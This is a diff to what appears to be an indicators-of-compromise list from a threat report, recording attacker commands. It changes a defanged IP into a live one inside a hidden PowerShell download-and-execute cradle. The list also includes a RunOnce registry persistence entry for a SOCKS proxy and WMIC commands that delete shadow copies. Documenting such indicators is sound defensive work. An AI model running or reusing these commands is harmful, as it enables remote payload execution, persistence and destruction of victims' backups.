@@ -26,7 +26,7 @@ IP Address
 
 Commands
 reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "socks5" /t REG_SZ /d "%TMP%\socks aug\socks.exe" /f
-powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://185.73.125[.]8:80/a67')
+powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://185.73.125.8:80/a67')
 
 SELECT * FROM Win32_ShadowCopy
 cmd.exe /c C:\Windows\System32\wbem\WMIC.exe shadowcopy where "ID='%s'" delete
